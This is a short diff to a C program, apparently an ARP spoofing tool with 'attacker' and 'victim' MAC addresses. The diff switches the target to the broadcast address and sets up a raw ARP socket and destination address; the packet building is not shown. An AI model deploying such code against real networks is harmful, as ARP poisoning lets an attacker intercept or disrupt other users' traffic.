@@ -20,9 +20,9 @@ int main(int ac, char **av)
     }
     
     unsigned char MAC_ATTACKER[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
-    unsigned char MAC_VICTIM[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    unsigned char MAC_VICTIM[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     
-    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 
     if (sock == -1)
     {
@@ -72,9 +72,14 @@ int main(int ac, char **av)
     int ifindex = iface_req.ifr_ifindex;
     struct sockaddr_ll socket_address;
 
+    memset(&socket_address, 0, sizeof(socket_address));
+
     socket_address.sll_family = AF_PACKET;
     socket_address.sll_protocol = htons(ETH_P_ARP);
     socket_address.sll_ifindex = ifindex;
+    socket_address.sll_halen = ETH_ALEN;
+    
+    memcpy(socket_address.sll_addr, MAC_VICTIM, ETH_ALEN);
 
     int packet_size = sizeof(struct ether_header) + sizeof(struct ether_arp);
     socklen_t addr_len = sizeof(struct sockaddr_ll);
